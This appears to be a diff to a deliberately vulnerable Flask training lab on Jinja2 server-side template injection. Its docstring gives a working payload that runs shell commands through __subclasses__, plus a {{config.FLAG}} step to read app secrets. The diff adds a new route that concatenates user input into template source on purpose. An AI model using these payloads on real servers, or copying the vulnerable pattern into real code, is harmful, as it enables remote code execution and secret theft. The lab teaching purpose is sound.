@@ -20,13 +20,19 @@ In Nullock:
     4. Find its index N. Then name to
        ?name={{''.__class__.__mro__[1].__subclasses__()[N]("id",shell=True,stdout=-1).communicate()}}
        Response includes the output of `id` -- RCE achieved.
-    5. Real fix: never bake user input INTO the template source. Use
+    5. Confirm success (no shell needed): GET /flag?name={{config.FLAG}}
+       -- same raw-concatenation vuln as /hello, reading a secret out
+       of the Flask app config via Jinja2's object graph. Proves SSTI
+       reaches server-side state, not just arithmetic.
+    6. Real fix: never bake user input INTO the template source. Use
        render_template_string("hello {{ name }}", name=user_input).
 """
 
-from flask import Flask, request, render_template_string
+import hashlib
+from flask import Flask, request, render_template_string, jsonify
 
 app = Flask(__name__)
+app.config["FLAG"] = "NULLOCK{%s}" % hashlib.sha256(b"lab-07-ssti").hexdigest()[:16]
 
 @app.route("/hello")
 def hello():
@@ -34,6 +40,18 @@ def hello():
     # VULN: user input concatenated into template source.
     template = f"hello {name}"
     return render_template_string(template)
+
+@app.route("/flag")
+def flag():
+    name = request.args.get("name", "world")
+    template = f"hello {name}"
+    try:
+        out = render_template_string(template)
+    except Exception:
+        return jsonify(solved=False), 400
+    if app.config["FLAG"] in out:
+        return jsonify(solved=True, flag=app.config["FLAG"])
+    return jsonify(solved=False), 403
 
 if __name__ == "__main__":
     app.run(host="127.0.0.1", port=5007, debug=False)
